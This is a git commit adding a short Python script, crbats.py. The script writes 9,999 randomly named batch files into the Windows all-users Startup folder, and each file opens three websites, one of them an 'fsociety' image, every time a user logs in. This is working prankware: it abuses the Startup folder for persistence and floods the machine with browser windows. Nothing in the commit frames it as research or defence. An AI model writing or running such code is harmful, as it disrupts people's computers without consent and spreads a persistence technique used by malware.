2607b63c30939f09c947706ed21e4ce1bc30c36d
saidecuro <138752417+leromixd@users.noreply.github.com>
2025-11-28 09:20:38 +0500

    Create crbats.py

---
+++ crbats.py
@@ -0,0 +1,14 @@
+import random
+import string
+import os
+TARGET_DIRECTORY = "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp"
+os.makedirs(TARGET_DIRECTORY, exist_ok=True)
+characters = string.ascii_letters + string.digits
+random_name = ''.join(random.choice(characters) for _ in range(9))
+filename = f"{random_name}.bat"
+for i in range(9999):
+    random_name = ''.join(random.choice(characters) for _ in range(9))
+    filename = f"{random_name}.bat"
+    with open(os.path.join(TARGET_DIRECTORY, filename), "w") as f:
+        f.write("start https://www.opsecsecurity.com/\nstart https://socradar.io\nstart https://static.ts.360.com/blog/wp-content/uploads/2016/08/160822-Post-fsociety-1.png")
+    print(f"BAT файл '{filename}' успешно создан в '{TARGET_DIRECTORY}'")
